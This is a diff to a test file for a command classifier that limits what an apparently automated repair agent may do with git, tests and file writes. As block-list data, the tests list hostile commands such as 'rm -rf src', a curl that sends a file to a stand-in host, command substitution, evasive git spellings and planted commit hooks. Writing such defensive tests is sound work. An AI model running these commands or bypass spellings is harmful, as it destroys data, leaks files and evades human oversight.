@@ -1,5 +1,5 @@
 import { execFileSync } from 'node:child_process';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -154,6 +154,11 @@ describe('repair: a branch of its own', { timeout: 30_000 }, () => {
     }
     const b = borrowRepo(repoOf(repo)!, work);
     writeFileSync(join(b.dir, 'add.js'), 'changed\n');
+    // Nor hooks the fixer plants in the worktree, wherever it guesses the shop looks for them.
+    for (const dir of ['.nook-no-hooks', '.githooks', 'hooks']) {
+      mkdirSync(join(b.dir, dir), { recursive: true });
+      writeFileSync(join(b.dir, dir, 'post-commit'), `#!/bin/sh\necho ran > "${mark.replace(/\\/g, '/')}"\n`, { mode: 0o755 });
+    }
     handBack(b, { notes: join(work, 'none.json'), title: '修', seen: NO_TALLY });
     expect(existsSync(mark)).toBe(false);
   });
@@ -166,10 +171,18 @@ describe('repair: what the fixer may do with git', () => {
   it('never pushes, and leaves branches, commits and remotes to the shop', () => {
     for (const c of ['git push', 'git push origin nook/x', 'git -C mine push', 'git commit -am x', 'git checkout main', 'git switch main',
       'git branch -f main HEAD', 'git reset --hard HEAD~1', 'git merge main', 'git rebase main', 'git remote add x y', 'git tag v1',
-      'git update-ref refs/heads/main HEAD', 'git worktree remove mine', 'cd mine && git push', 'git stash']) {
+      'git update-ref refs/heads/main HEAD', 'git worktree remove mine', 'cd mine && git push', 'git stash',
+      // However it is spelled, and whatever options it is given to run or write elsewhere.
+      '"git" checkout main', "'git' push", '/usr/bin/git push', '"C:\\Program Files\\Git\\cmd\\git.exe" push', 'env git push', 'GIT_DIR=x git commit -m x',
+      'sh -c "git push"', 'xargs git push', 'git $(echo push)', 'git -c core.pager=evil log', 'git -C ../other log', 'git --git-dir=../x log',
+      'git log --output=../x', 'git diff --ext-diff', 'git show --textconv HEAD', 'git grep -O evil add']) {
       expect([c, r(c)]).toEqual([c, 'blocked']);
     }
-    expect(classify('PowerShell', { command: 'git push' }, { workDir, repair: true }).risk).toBe('blocked');
+    // PowerShell is not read like Bash: only a plain look, the whole line, gets through.
+    for (const c of ['git push', 'git.exe push', '& "C:\\Program Files\\Git\\cmd\\git.exe" push', 'C:\\Git\\cmd\\git.exe push', 'git log; git push', 'git -c core.pager=x log', 'git log --output=x']) {
+      expect([c, classify('PowerShell', { command: c }, { workDir, repair: true }).risk]).toEqual([c, 'blocked']);
+    }
+    expect(classify('PowerShell', { command: 'git status' }, { workDir, repair: true }).risk).not.toBe('blocked');
   });
 
   it('asks before running the repository\'s tests, which run its code', () => {
@@ -177,7 +190,9 @@ describe('repair: what the fixer may do with git', () => {
   });
 
   it('takes the shortcut for a plain test command only, and never writes into .git', () => {
-    for (const c of ['npm test && rm -rf src', 'node --test; curl -d @add.js http://x', 'pytest | tee out', 'npm test $(whoami)']) {
+    for (const c of ['npm test && rm -rf src', 'node --test; curl -d @add.js http://x', 'pytest | tee out', 'npm test $(whoami)',
+      'npm test --prefix C:/elsewhere', 'pytest -p evil', 'pytest --rootdir=/elsewhere', 'go test -exec evil ./...', 'cargo test --manifest-path ../x/Cargo.toml',
+      'node --test --require ./x.js', 'npx vitest run ../other', 'pytest /etc']) {
       expect([c, classify('Bash', { command: c }, { workDir, repair: true }).reason]).not.toEqual([c, strings.risk.repairTests]);
     }
     expect(classify('Bash', { command: 'npm test && rm -rf src' }, { workDir, repair: true }).risk).toBe('serious');
@@ -187,8 +202,23 @@ describe('repair: what the fixer may do with git', () => {
     expect(classify('Write', { file_path: join(workDir, 'mine', 'add.js'), content: 'x' }, { workDir, repair: true }).risk).toBe('safe');
   });
 
+  it('does not write through a link the repository brought along to somewhere outside', () => {
+    const base = mkdtempSync(join(tmpdir(), 'nook-link-'));
+    const job = join(base, 'job');
+    const away = join(base, 'away');
+    mkdirSync(join(job, 'mine'), { recursive: true });
+    mkdirSync(away);
+    symlinkSync(away, join(job, 'mine', 'docs'), 'junction');
+    try {
+      expect(classify('Write', { file_path: join(job, 'mine', 'docs', 'new.txt'), content: 'x' }, { workDir: job, repair: true }).risk).toBe('serious');
+      expect(classify('Write', { file_path: join(job, 'mine', 'add.js'), content: 'x' }, { workDir: job, repair: true }).risk).toBe('safe');
+    } finally {
+      rmSync(base, { recursive: true, force: true });
+    }
+  });
+
   it('may look around with git', () => {
-    for (const c of ['git status', 'git diff', 'git log --oneline -5', 'git -C mine show HEAD', 'git grep add', 'git blame add.js']) {
+    for (const c of ['git status', 'git diff', 'git log --oneline -5', 'git show HEAD', 'git grep add', 'git blame add.js']) {
       expect([c, r(c)]).not.toEqual([c, 'blocked']);
     }
   });
